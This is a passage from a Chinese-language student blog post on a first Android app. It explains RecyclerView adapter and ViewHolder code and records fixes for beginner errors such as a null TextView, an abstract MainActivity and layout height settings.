view;</span><br></pre></td></tr></table></figure><p>主要作用是在Fragment的UI界面中展示一个列表视图（RecyclerView），并将数据源（List）提供给适配器（Adapter），以便进行数据的绑定和显示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinearLayoutManager manager=new LinearLayoutManager(view.getContext());</span><br></pre></td></tr></table></figure><ul><li>创建了一个LinearLayoutManager对象，传入了view.getContext()的上下文参数。通过这个参数，LinearLayoutManager可以获取到包含该RecyclerView的Activity或Fragment的Context对象，并在该上下文中设置LinearLayoutManager的属性。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager.setOrientation(LinearLayoutManager.VERTICAL);</span><br></pre></td></tr></table></figure><ul><li>对这个布局做界面调整 要垂直的</li></ul><h4 id="Myadapter-java说明"><a href="#Myadapter-java说明" class="headerlink" title="Myadapter.java说明"></a>Myadapter.java说明</h4><blockquote><p> &#x3D;&#x3D;RecyclerView中的Myadapter&#x3D;&#x3D;</p></blockquote><p>是一个管理数据和视图之间关系的类</p><p>为RecyclerView提供数据并创建对应的视图项</p><p>Adapter通常继承自RecyclerView.Adapter类，并通过重写其中的方法来实现自定义逻辑。例如，常见的方法包括：</p><ul><li><code>onCreateViewHolder()</code>：用于创建ViewHolder对象，即每个Item对应的视图项。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> Myholder <span class="title function_">onCreateViewHolder</span><span class="params">(<span class="meta">@NonNull</span> ViewGroup parent, <span class="type">int</span> viewType)</span> &#123;</span><br><span class="line"></span><br><span class="line">        View view=LayoutInflater.from(context1).inflate(R.layout.item,parent,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//布局的压缩</span></span><br><span class="line"><span class="comment">//        Inflater inflater=new Inflater();</span></span><br><span class="line"><span class="comment">//        inflater.inflate(); 真正的压缩</span></span><br><span class="line">        Myholder myholder=<span class="keyword">new</span> <span class="title class_">Myholder</span>(view);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> myholder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>onBindViewHolder()</code>：用于将数据绑定到ViewHolder中的视图项上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBindViewHolder</span><span class="params">(<span class="meta">@NonNull</span> Myholder holder, <span class="type">int</span> position)</span> &#123;</span><br><span class="line">  </span><br><span class="line">     holder.textView.setText(list1.get(position));<span class="comment">//用于设置TextView的文本内容为数据列表list1中指定位置的数据</span></span><br><span class="line">    </span><br><span class="line">     holder.textView.setTextColor(Color.RED); <span class="comment">// 将颜色设置为红色</span></span><br><span class="line">  </span><br><span class="line"> &#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><code>getItemCount()</code>：返回数据集合的大小，即Item的数量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getItemCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list1.size();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>定义一个名为<code>Myholder</code>的自定义<code>ViewHolder</code>类，它继承自<code>RecyclerView</code>的内部类<code>ViewHolder</code></p></li></ul><p>​     是用来表示每个数据项的视图项的，并且可以在需要时对其进行重用。ViewHolder通过保存视图项中的子视图     （例如TextView、ImageView等）的引用，以便在需要时快速地访问和更新视图内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myholder</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.ViewHolder&#123;</span><br><span class="line">    TextView textView;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Myholder</span><span class="params">(<span class="meta">@NonNull</span> View itemView)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(itemView);</span><br><span class="line">        textView=itemView.findViewById(R.id.textView1);<span class="comment">//引用item.xml里id为textView1的textView作为Myholder这个类中</span></span><br><span class="line">        <span class="comment">//textView对象的初始值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五、报错部分"><a href="#五、报错部分" class="headerlink" title="五、报错部分"></a>五、报错部分</h2><h3 id="1、error-‘-tools-sample-avatars’-is-incompatible-with-attribute-src-attr-referencelcolor"><a href="#1、error-‘-tools-sample-avatars’-is-incompatible-with-attribute-src-attr-referencelcolor" class="headerlink" title="1、error: ‘@tools:sample&#x2F;avatars’ is incompatible with attribute src (attr) referencelcolor."></a>1、error: ‘@tools:sample&#x2F;avatars’ is incompatible with attribute src (attr) referencelcolor.</h3><p><img src="https://s2.loli.net/2023/11/10/JcErvxd8BHolIyw.png" alt="image-20231009100556565"></p><p>用的是系统自带图片</p><p>自定义了2个src</p><p><strong>solve：</strong></p><p>把tools的那个删除</p><p>只留下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srcCompat：=&quot;@drawable/xiaoxi&quot;</span><br></pre></td></tr></table></figure><p>后面跟的是图片存放路径</p><h3 id="2：图片命名飘红"><a href="#2：图片命名飘红" class="headerlink" title="2：图片命名飘红"></a>2：图片命名飘红</h3><p><img src="https://s2.loli.net/2023/11/10/BbK2PqU4N8AVogf.png" alt="image-20231009091749232"></p><p>solve：</p><p>命名修改为英文的就行</p><h3 id="3：没报错但打开程序一直闪退"><a href="#3：没报错但打开程序一直闪退" class="headerlink" title="3：没报错但打开程序一直闪退"></a>3：没报错但打开程序一直闪退</h3><p>一开始也不知道怎么办，上网搜索后才发现要查看日志</p><p>运行不报错，但是日志会报错(get了)</p><p>查找日志方法：</p><p><img src="https://s2.loli.net/2023/11/10/HNLwjxZ5nDI7Y1k.png" alt="image-20231014194327863"></p><h3 id="4：Unable-to-instantiate-activity-ComponentInfo-com-example-demo-com-example-demo-MainActivity"><a href="#4：Unable-to-instantiate-activity-ComponentInfo-com-example-demo-com-example-demo-MainActivity" class="headerlink" title="4：Unable to instantiate activity ComponentInfo{com.example.demo&#x2F;com.example.demo.MainActivity}:"></a>4：Unable to instantiate activity ComponentInfo{com.example.demo&#x2F;com.example.demo.MainActivity}:</h3><p>说无法是实例化MainActivity</p><p><img src="https://s2.loli.net/2023/11/10/dyU82jiKQnaeSYv.png" alt="image-20231014194613213"></p><p>查看后发现我创建的时候不小心加了一个abstract</p><p><img src="https://gitee.com/jardny/typora_images/raw/master/images/image-20231014194647503.png" alt="image-20231014194647503"></p><p><font color="red">！！！</font>：abstract是抽象类，抽象类是不行进行实例化的</p><h3 id="5：-Attempt-to-invoke-virtual-method-‘void-android-widget-TextView-setText-java-lang-CharSequence-’"><a href="#5：-Attempt-to-invoke-virtual-method-‘void-android-widget-TextView-setText-java-lang-CharSequence-’" class="headerlink" title="5： Attempt to invoke virtual method ‘void android.widget.TextView.setText(java.lang.CharSequence)’"></a>5： Attempt to invoke virtual method ‘void android.widget.TextView.setText(java.lang.CharSequence)’</h3><p>意思是在代码中尝试<font color="red">对一个空对象进行操作</font>。具体来说，这个错误提示是因为在Myadapter.java文件的43行，尝试对一个TextView对象进行setText()方法的调用，但该TextView对象是null，即没有被正确地初始化或找到。</p><p>所以应该是getid的问题 没有正确的get到</p><p><img src="https://gitee.com/jardny/typora_images/raw/master/images/image-20231014194929174.png" alt="image-20231014194929174"></p><p>果然这里写错了</p><p>我的textView的id是textView1，但是我一开始写成立textView</p><p>而这个id是个空的</p><h3 id="6、要滑动才行，不是老师要求的显示在一个界面"><a href="#6、要滑动才行，不是老师要求的显示在一个界面" class="headerlink" title="6、要滑动才行，不是老师要求的显示在一个界面"></a>6、要滑动才行，不是老师要求的显示在一个界面</h3><p><img src="https://s2.loli.net/2023/11/10/aEFgJnowqB1rW95.jpg" alt="img"></p><p><img src="https://s2.loli.net/2023/11/10/8ajhlxpJZbeSI2F.png" alt="img"></p><p>s：<img src="https://gitee.com/jardny/typora_images/raw/master/images/image-20231013100211283.png" alt="image-20231013100211283"></p><p>把linearlayout中的height变为wrap_content</p><p>因为滑动显示是有关高度的参数</p><blockquote><p>wrap_content 尽量缩小为合适的页面</p><p>match_parent 把父页面中找到显示合适的地方</p></blockquote><h2 id="六、Summary"><a href="#六、Summary" class="headerlink" title="六、Summary"></a>六、Summary</h2><p>第一次尝试Android开发，挺有趣但是也挺难，还是有很多不懂，希望后面自己能坚持总结写博客，解决完自己的errors之后有同学来问我，其实也都是这些问题,解决完自己的问题之后，感觉收获很大，印象很深</p><p>希望总结下来，减少大家浪费的时间</p><p>源码地址：<a href="https://gitee.com/jardny/My_AndroidWork">https://gitee.com/jardny/My_AndroidWork</a></p>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
